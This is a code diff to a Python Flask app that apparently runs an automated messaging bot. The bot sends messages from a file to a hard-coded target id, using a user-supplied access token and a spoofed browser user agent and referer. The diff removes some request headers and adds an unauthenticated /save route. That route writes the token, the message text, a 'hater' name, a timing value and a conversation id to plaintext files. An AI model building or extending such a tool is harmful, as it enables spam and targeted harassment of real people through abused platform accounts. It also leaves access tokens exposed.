@@ -16,12 +16,8 @@ def send_initial_message():
     target_id = "61563340317000"
     headers = {
         'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
         'User-Agent': 'Mozilla/5.0',
         'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9',
         'referer': 'www.google.com'
     }
 
@@ -50,12 +46,8 @@ def send_messages_from_file():
 
     headers = {
         'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
         'User-Agent': 'Mozilla/5.0',
         'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9',
         'referer': 'www.google.com'
     }
 
@@ -81,6 +73,17 @@ def main():
 @app.route('/')
 def home():
     return render_template('index.html')
+
+@app.route('/save', methods=['POST'])
+def save_inputs():
+    data = request.form
+    with open('token.txt', 'w') as f: f.write(data.get('token', ''))
+    with open('file.txt', 'w') as f: f.write(data.get('message', ''))
+    with open('name.txt', 'w') as f: f.write(data.get('hater', ''))
+    with open('here.txt', 'w') as f: f.write(data.get('here', ''))
+    with open('time.txt', 'w') as f: f.write(data.get('time', ''))
+    with open('convo.txt', 'w') as f: f.write(data.get('convo', ''))
+    return "✅ Saved"
 
 @app.route('/start', methods=['POST'])
 def start_bot():
